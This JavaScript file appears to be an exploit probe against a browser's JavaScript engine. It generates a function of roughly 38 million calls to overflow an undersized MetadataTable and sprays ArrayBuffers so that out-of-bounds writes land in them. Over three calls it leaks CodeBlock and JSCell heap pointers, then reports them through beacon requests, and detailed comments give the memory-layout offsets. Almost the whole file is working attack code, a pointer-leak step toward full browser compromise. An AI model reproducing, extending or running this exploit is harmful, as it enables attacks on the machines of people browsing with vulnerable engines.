// p150f — MetadataTable overflow: three-call pointer leak
// Beacon prefix: V150F-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150F-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    if (!window.__bigOk) return;

    // SAME callback for all 3 calls — avoids linked-list corruption
    // from re-linking entry #0 with a different callee
    var mode = 0;  // 0=compile-trigger, 1=setSeen, 2=linkMono
    var cnt = 0;

    function cb() {
      if (mode === 0) throw 1; // call 1: throw immediately after compile
      cnt++;
      if (cnt === 1) BS('C' + (mode+1) + '-M1');
      if (cnt === 894) BS('C' + (mode+1) + '-M894-OOB');
      if (cnt === 950) {
        BS('C' + (mode+1) + '-M950-BAIL');
        throw mode + 1;
      }
    }

    // ---- CALL 1: Trigger lazy compilation, bail immediately ----
    // This allocates the undersized MetadataTable buffer
    BS('C1-START');
    mode = 0; cnt = 0;
    try { window.__bigFn(cb); } catch (e) { BS('C1-OK'); }

    // ---- SPRAY: 300 x 100KB zeroed ArrayBuffers ----
    // Allocated AFTER metadata buffer → higher addresses → OOB reads hit these
    var sprays = [];
    for (var i = 0; i < 300; i++) {
      sprays.push(new ArrayBuffer(100096));
    }
    BS('SPRAY-300');

    // ---- CALL 2: Execute 950 calls → setSeen on entries 0-949 ----
    // Entry #0: seenOnce=true from call 1 → linkMonomorphicCall → caches cb
    // Entries #1-949: seenOnce=false → setSeen() only (stores 1 bit)
    // OOB entries #894-949: setSeen writes bit into our spray
    BS('C2-START');
    mode = 1; cnt = 0;
    try { window.__bigFn(cb); } catch (e) { BS('C2-THREW-' + cnt); }

    // ---- CALL 3: Execute 950 calls → linkMonomorphicCall writes pointers ----
    // Entry #0: m_callee == cb → CACHE HIT → fast path (no slow path)
    // Entries #1-893: seenOnce=true → linkMonomorphicCall → writes pointers (in-bounds)
    // Entries #894-949: seenOnce=true → linkMonomorphicCall → WRITES POINTERS TO SPRAY!
    // Written data: CodeBlock*, callee JSCell*, code entry ptr, list ptrs
    BS('C3-START');
    mode = 2; cnt = 0;
    try { window.__bigFn(cb); } catch (e) { BS('C3-THREW-' + cnt); }

    // ---- SCAN: Read leaked pointers from spray ----
    BS('SCAN-START');
    var hitBufs = 0;
    var totalNZ = 0;

    for (var i = 0; i < sprays.length; i++) {
      var u32 = new Uint32Array(sprays[i]);
      var nz = 0;
      for (var j = 0; j < u32.length; j++) {
        if (u32[j] !== 0) nz++;
      }
      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 5) {
          // Report first 8 non-zero dwords for analysis
          var reported = 0;
          for (var k = 0; k < u32.length && reported < 8; k++) {
            if (u32[k] !== 0) {
              // Report offset and value: L-b<buf>-o<byteOffset>-v<hexValue>
              BS('L-b' + i + '-o' + (k * 4) + '-v' + u32[k].toString(16));
              reported++;
            }
          }
        }
      }
    }
    BS('SCAN-bufs' + hitBufs + '-nz' + totalNZ);

    // Dump first hit buffer's raw bytes at metadata-stride offsets
    // Each OOB metadata entry is 112 bytes. Key fields:
    // +0:  PackedRawSentinelNode (m_next, m_prev) — 12 bytes, heap ptrs
    // +48: m_calleeOrCodeBlock — 8 bytes, JSCell ptr
    // +56: m_lastSeenCalleeOrExecutable — 8 bytes, JSCell ptr
    if (hitBufs > 0) {
      for (var i = 0; i < sprays.length; i++) {
        var u32 = new Uint32Array(sprays[i]);
        var anyNZ = false;
        for (var j = 0; j < u32.length; j++) {
          if (u32[j] !== 0) { anyNZ = true; break; }
        }
        if (!anyNZ) continue;

        // Dump at 112-byte stride (metadata entry size)
        for (var entry = 0; entry < 3; entry++) {
          var base = (entry * 112) / 4; // dword offset
          if (base + 28 > u32.length) break;

          // Dump key dword pairs (pointer-width reads)
          // offset +0 (m_next lo/hi)
          var v0 = u32[base].toString(16);
          var v1 = u32[base + 1].toString(16);
          BS('D-b' + i + '-e' + entry + '-p0-' + v1 + '_' + v0);

          // offset +48 (m_calleeOrCodeBlock lo/hi)
          var v12 = u32[base + 12].toString(16);
          var v13 = u32[base + 13].toString(16);
          BS('D-b' + i + '-e' + entry + '-p48-' + v13 + '_' + v12);

          // offset +56 (m_lastSeenCalleeOrExecutable lo/hi)
          var v14 = u32[base + 14].toString(16);
          var v15 = u32[base + 15].toString(16);
          BS('D-b' + i + '-e' + entry + '-p56-' + v15 + '_' + v14);
        }
        break; // only first hit buffer
      }
    }

    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
